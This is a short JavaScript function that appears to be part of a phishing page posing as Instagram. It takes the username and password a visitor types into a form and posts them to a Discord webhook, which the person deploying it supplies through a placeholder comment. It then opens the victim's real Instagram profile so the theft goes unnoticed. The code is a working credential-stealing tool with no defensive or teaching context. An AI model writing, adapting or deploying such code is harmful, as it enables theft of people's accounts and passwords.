function sendMessage() {
    var request = new XMLHttpRequest();
    request.open("POST", "WEBHOOK URL"); //here your discord webhook

    request.setRequestHeader('Content-type', 'application/json');

    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;

    let data = username+":"+password

    var params = {
      username: "Instagram",
      avatar_url: "",
      content: data
    }

    let link = "http://instagram.com/"+username

    window.open(link)

    request.send(JSON.stringify(params));
  }
